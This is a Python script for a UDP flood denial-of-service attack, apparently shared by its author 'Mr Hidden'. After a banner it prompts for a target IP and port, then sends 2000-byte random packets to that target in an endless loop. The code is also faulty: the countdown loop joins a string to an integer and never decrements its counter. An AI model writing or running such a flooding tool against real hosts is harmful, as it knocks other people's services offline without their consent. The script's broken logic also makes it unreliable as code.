import sys
import os
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(2000)
os.system("clear")
Baner = '''\033[1;34m                                                        
			      MMMMM       MMMMM   RRRRRRRRR
	  		      MM   MM   MM   MM   RR       RR
			      MM    MM MM    MM   RR       RR 
			      MM     MMM     MM   RRRRRRRRRR
			      MM             MM   RR     RR
			      MM             MM   RR      RR
			      MM             MM   RR       RR

 HHHH   HHHH   IIII   DDDDDDDDDD       DDDDDDDDDD      EEEEEEEEEEE    NNNNN          NN
  HH     HH     II    DD        DD     DD        DD    EE             NN  NN         NN
  HH     HH     II    DD         DD    DD         DD   EE             NN   NN        NN
  HH     HH     II    DD          DD   DD          DD  EE             NN    NN       NN
  HHHHHHHHH     II    DD          DD   DD          DD  EEEEEEEEEEE    NN     NN      NN
  HHHHHHHHH     II    DD          DD   DD          DD  EEEEEEEEEEE    NN      NN     NN
  HH     HH     II    DD          DD   DD          DD  EE             NN       NN    NN
  HH     HH     II    DD         DD    DD         DD   EE             NN        NN   NN
  HH     HH     II    DD        DD     DD        DD    EE             NN         NN  NN
 HHHH   HHHH   IIII   DDDDDDDDDD       DDDDDDDDDD      EEEEEEEEEEE    NN          NNNNN
\033[1;31m \n
                      =========================================
                      =                                       =
                      =           Made by Mr Hidden           =
                      =                                       =
                      =              @Hidden0612              =
                      =         github.com/Hidden0612         =
                      =========================================
'''
print(Baner)
ip = input("\033[0m Please enter the IP  : ")
port = int(input("\033[0m Please enter the Port  : "))
os.system("clear") ; print(Baner + '\n\033[1;33m<<===[: (please with) :]===>>') # <-----
time.sleep(5)
os.system("clear")
print("\033[1;35m >>>> attack has been start in: ")

x = 5
while x > 0:
	print('\033[1;30m[: ' + x + ' :]', end='\r')
	time.sleep(1)

#time.sleep(1)
#print("\033[1;32m[: 5 :]")
#time.sleep(1)
#print("\033[1;34m[: 4 :]")
#time.sleep(1)
#print("\033[1;31m[: 3 :]")
#time.sleep(1)
#print("\033[1;39m[: 2 :]")
#time.sleep(1)
#print("\033[1;30m[: 1 :] :] :]")
#time.sleep(3)

os.system("clear")
time.sleep(2)

sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 2
    port = port
    print("\033[1;92mpacket sent to %s on port:%s" % (ip, port))
